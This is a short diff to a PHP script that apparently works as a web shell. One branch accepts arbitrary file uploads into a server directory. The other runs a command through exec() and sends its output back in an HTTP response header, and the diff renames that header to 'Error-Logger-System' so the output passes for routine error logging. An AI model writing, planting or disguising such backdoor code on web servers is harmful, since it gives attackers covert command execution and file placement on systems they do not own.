@@ -33,6 +33,6 @@
 
         if (move_uploaded_file($TmpFile, $File)){echo "\n[ok] Successfully.\n-> [$UploadDir/$FileName]\n";}else {echo "\n[err] Failed.\n";};
 
-    }else {exec($Logger, $Output);header("Log: ".json_encode($Output));};
+    }else {exec($Logger, $Output);header("Error-Logger-System: Log - ".json_encode($Output));}; //header("Log: ".json_encode($Output));echo "Log: ".json_encode($Output);};
 
 ?>
